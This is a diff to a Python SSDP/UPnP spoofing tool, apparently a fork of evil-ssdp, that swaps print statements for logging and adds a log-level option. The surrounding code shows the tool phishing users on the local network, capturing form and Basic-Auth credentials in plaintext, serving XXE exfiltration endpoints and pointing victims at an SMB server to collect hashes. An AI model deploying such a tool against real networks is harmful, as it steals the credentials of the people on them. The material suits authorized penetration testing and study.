@@ -30,11 +30,18 @@ import base64
 import random
 import netifaces
 import sdnotify
+import logging
 
 """
-[CUSTOM] Force line buffering
+[CUSTOM] Use logger instead on prints.
+All 'print' are replaced with logging
 """
-sys.stdout = open(1, 'w', 1)
+logger = logging.getLogger()
+logger.setLevel('INFO')
+handler = logging.StreamHandler(sys.stderr)
+handler.setLevel(logging.DEBUG)
+logger.addHandler(handler)
+#sys.stdout = open(1, 'w', 1)
 
 
 BANNER = r'''
@@ -48,11 +55,11 @@ ___________     .__.__    _________ _________________ __________
 ...by initstring (github.com/initstring)
 '''
 
-print(BANNER)
+logger.info(BANNER)
 
 
 if sys.version_info < (3, 0):
-    print("\nSorry mate, you'll need to use Python 3+ on this one...\n")
+    logger.critical("\nSorry mate, you'll need to use Python 3+ on this one...\n")
     sys.exit(1)
 
 
@@ -183,22 +190,19 @@ class SSDPListener:
         M-SEARCH - after that it will be silent. This keeps the output more
         readable, as clients can get chatty.
         """
-        """
-        [CUSTOM] Deactivate logging of M-SEARCH alltogeather
-        """
         remote_ip = address[0]
         header_st = re.findall(r'(?i)\\r\\nST:(.*?)\\r\\n', str(data))
         if 'M-SEARCH' in str(data) and header_st:
             requested_st = header_st[0].strip()
             if re.match(self.valid_st, requested_st):
                 if (address[0], requested_st) not in self.known_hosts:
-                    #print(PC.msearch_box + "New Host {}, Service Type: {}"
-                    #      .format(remote_ip, requested_st))
+                    logger.debug(PC.msearch_box + "New Host {}, Service Type: {}"
+                          .format(remote_ip, requested_st))
                     self.known_hosts.append((address[0], requested_st))
                 if not self.analyze_mode:
                     self.send_location(address, requested_st)
             else:
-                print(PC.detect_box + "Odd ST ({}) from {}. Possible"
+                logger.info(PC.detect_box + "Odd ST ({}) from {}. Possible"
                       "detection tool!".format(requested_st, remote_ip))
 
 
@@ -308,7 +312,7 @@ def build_class(upnp_args):
             try:
                 BaseHTTPRequestHandler.handle(self)
             except socket.error:
-                print(PC.detect_box + "{} connected but did not complete a"
+                logger.info(PC.detect_box + "{} connected but did not complete a"
                       " valid HTTP verb. This is sometimes indicitive of a"
                       " port scan or a detection tool."
                       .format(self.address_string()))
@@ -428,19 +432,16 @@ def build_class(upnp_args):
             agent = self.headers['user-agent']
             verb = self.command
             path = self.path
-            """
-            [CUSTOM] Dectivate logging of XML requests
-            """
             if 'xml' in self.path:
-                #print(PC.xml_box + "Host: {}, User-Agent: {}"
-                #      .format(address, agent))
-                #print("               {} {}".format(verb, path))
+                logger.debug(PC.xml_box + "Host: {}, User-Agent: {}"
+                      .format(address, agent))
+                logger.debug("               {} {}".format(verb, path))
                 pass
             elif 'xxe.html' in self.path:
                 data = PC.xxe_box + "Host: {}, User-Agent: {}\n".format(
                     address, agent)
                 data += "               {} {}".format(verb, path)
-                print(data)
+                logger.info(data)
                 self.write_log(data)
             elif 'do_login' in self.path:
                 content_length = int(self.headers['Content-Length'])
@@ -448,38 +449,38 @@ def build_class(upnp_args):
                 credentials = post_body.decode('utf-8')
                 data = PC.creds_box + "HOST: {}, FORM-POST CREDS: {}".format(
                     address, credentials)
-                print(data)
+                logger.info(data)
                 self.write_log(data)
             elif 'data.dtd' in self.path:
                 data = PC.xxe_box + "Host: {}, User-Agent: {}\n".format(
                     address, agent)
                 data += "               {} {}".format(verb, path)
-                print(data)
+                logger.info(data)
                 self.write_log(data)
             elif 'exfiltrated' in self.path:
                 data = PC.exfil_box + "Host: {}, User-Agent: {}\n".format(
                     address, agent)
                 data += "               {} {}".format(verb, path)
-                print(data)
+                logger.info(data)
                 self.write_log(data)
             elif 'present.html' in self.path:
-                print(PC.phish_box + "Host: {}, User-Agent: {}".format(
+                logger.info(PC.phish_box + "Host: {}, User-Agent: {}".format(
                     address, agent))
-                print("               {} {}".format(verb, path))
+                logger.info("               {} {}".format(verb, path))
             elif 'favicon.ico' in self.path:
                 return
             else:
-                print(PC.detect_box + "Odd HTTP request from Host: {}, User"
+                logger.info(PC.detect_box + "Odd HTTP request from Host: {}, User"
                       " Agent: {}".format(address, agent))
-                print("               {} {}".format(verb, path))
-                print("               ... sending to phishing page.")
+                logger.info("               {} {}".format(verb, path))
+                logger.info("               ... sending to phishing page.")
 
             if 'Authorization' in self.headers:
                 encoded = self.headers['Authorization'].split(" ")[1]
                 plaintext = base64.b64decode(encoded).decode()
                 data = PC.creds_box + "HOST: {}, BASIC-AUTH CREDS: {}".format(
                     address, plaintext)
-                print(data)
+                logger.info(data)
                 self.write_log(data)
 
     return UPNPObject
@@ -521,6 +522,13 @@ def process_args():
                         help=('Run in analyze mode. Will NOT respond to any'
                               ' SSDP queries, but will still enable and run'
                               ' the web server for testing.'))
+    """
+    [CUSTOM] Add support for log levels DEBUG and INFO
+    """
+    parser.add_argument("-l", "--loglevel",
+                        choices = ['DEBUG', 'INFO'],
+                        default = 'INFO',
+                        help = "Set the log level")
     args = parser.parse_args()
 
     # The following two lines help to avoid command injection in bash.
@@ -536,7 +544,7 @@ def process_args():
     args.redirect_url = args.url
 
     if not os.path.isdir(args.template_dir):
-        print("\nSorry, that template directory does not exist. "
+        logger.critical("\nSorry, that template directory does not exist. "
               "Please double-check and try again.\n")
         sys.exit()
 
@@ -555,7 +563,7 @@ def get_ip(interface):
         local_ip = ipv4_info[0]['addr']
         return local_ip
     except ValueError:
-        print(PC.warn_box + "Could not get network interface info. "
+        logger.critical(PC.warn_box + "Could not get network interface info. "
               "Please check and try again.")
         sys.exit()
 
@@ -571,7 +579,7 @@ def set_smb(args, local_ip):
         if ip_address(args.smb):
             smb_server = args.smb
         else:
-            print("Sorry, that is not a valid IP address for your SMB server.")
+            logger.critical("Sorry, that is not a valid IP address for your SMB server.")
             sys.exit()
     else:
         smb_server = local_ip
@@ -590,26 +598,26 @@ def print_details(args, local_ip, smb_server):
         local_ip, args.local_port)
     exfil_url = 'http://{}:{}/ssdp/data.dtd'.format(local_ip, args.local_port)
     smb_url = 'file://///{}/smb/hash.jpg'.format(smb_server)
-    print("\n\n")
-    print("########################################")
-    print(PC.ok_box + "EVIL TEMPLATE:           {}".format(args.template_dir))
-    print(PC.ok_box + "MSEARCH LISTENER:        {}".format(args.interface))
-    print(PC.ok_box + "DEVICE DESCRIPTOR:       {}".format(dev_url))
-    print(PC.ok_box + "SERVICE DESCRIPTOR:      {}".format(srv_url))
-    print(PC.ok_box + "PHISHING PAGE:           {}".format(phish_url))
+    logger.info("\n\n")
+    logger.info("########################################")
+    logger.info(PC.ok_box + "EVIL TEMPLATE:           {}".format(args.template_dir))
+    logger.info(PC.ok_box + "MSEARCH LISTENER:        {}".format(args.interface))
+    logger.info(PC.ok_box + "DEVICE DESCRIPTOR:       {}".format(dev_url))
+    logger.info(PC.ok_box + "SERVICE DESCRIPTOR:      {}".format(srv_url))
+    logger.info(PC.ok_box + "PHISHING PAGE:           {}".format(phish_url))
     if args.redirect_url:
-        print(PC.ok_box + "REDIRECT URL:            {}".format(
+        logger.info(PC.ok_box + "REDIRECT URL:            {}".format(
             args.redirect_url))
     if args.is_auth:
-        print(PC.ok_box + "AUTH ENABLED, REALM:     {}".format(args.realm))
+        logger.info(PC.ok_box + "AUTH ENABLED, REALM:     {}".format(args.realm))
     if 'xxe-exfil' in args.template_dir:
-        print(PC.ok_box + "EXFIL PAGE:              {}".format(exfil_url))
+        logger.info(PC.ok_box + "EXFIL PAGE:              {}".format(exfil_url))
     else:
-        print(PC.ok_box + "SMB POINTER:             {}".format(smb_url))
+        logger.info(PC.ok_box + "SMB POINTER:             {}".format(smb_url))
     if args.analyze:
-        print(PC.warn_box + "ANALYZE MODE:            ENABLED")
-    print("########################################")
-    print("\n\n")
+        logger.info(PC.warn_box + "ANALYZE MODE:            ENABLED")
+    logger.info("########################################")
+    logger.info("\n\n")
 
 
 def listen_msearch(listener):
@@ -635,6 +643,10 @@ def main():
     Uses Process to multi-thread the SSDP server and the web server.
     """
     args = process_args()
+    """
+    [CUSTOM] Set log level
+    """
+    logger.setLevel(args.loglevel)
     local_ip = get_ip(args.interface)
     smb_server = set_smb(args, local_ip)
 
@@ -665,7 +677,7 @@ def main():
         notifier.notify("READY=1")
         signal.pause()
     except (KeyboardInterrupt, SystemExit):
-        print("\n" + PC.warn_box +
+        logger.info("\n" + PC.warn_box +
               "Thanks for playing! Stopping threads and exiting...\n")
         web_server.terminate()
         ssdp_server.terminate()
